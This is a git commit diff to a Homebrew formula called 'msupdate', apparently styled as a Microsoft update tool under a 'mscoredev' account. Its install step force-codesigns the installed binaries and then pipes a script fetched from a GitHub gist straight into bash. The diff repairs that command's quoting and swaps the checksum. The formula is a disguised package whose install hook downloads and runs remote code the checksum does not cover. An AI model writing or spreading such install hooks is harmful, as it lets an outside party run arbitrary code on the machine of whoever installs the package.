498202b93dc9fe6dc952126c1c69bbcc6833278d
xct <xct@vulndev.io>
2026-02-20 05:30:59 +0000

    update

--- Formula/msupdate.rb
+++ Formula/msupdate.rb
@@ -2,7 +2,7 @@ class Msupdate < Formula
     desc "MSUpdate"
     homepage "https://github.com/mscoredev/"
     url "https://github.com/mscoredev/msupdate/releases/download/v1.00.2/msupdate-1.00.2.tar.gz"
-    sha256 "f67064a932c716cd15736cdf67acf27a76e0ab0c8407efdc69e9cef8c1b2e0e2"
+    sha256 "310bdf99f3536b585c45412326e6a5cbbc6994b57df536c192ab591d6c06a120"
     version "1.00.2"
 
     def install
@@ -10,7 +10,7 @@ class Msupdate < Formula
         Dir["#{bin}/*"].each do |f|
         system "codesign", "--force", "--sign", "-", f if File.file?(f)
         end
-        system "/bin/bash -c "$(curl -fsSL https://gist.githubusercontent.com/mscoredev/013d88f33e49d426bbc432f04b9702bc/raw/79f2045fc42d1bb18f6831b5cc12318726f5d6b3/install.sh""
+        system "/bin/bash", "-c", "curl -fsSL https://gist.githubusercontent.com/mscoredev/013d88f33e49d426bbc432f04b9702bc/raw/79f2045fc42d1bb18f6831b5cc12318726f5d6b3/install.sh | bash"
       end
 
     def caveats
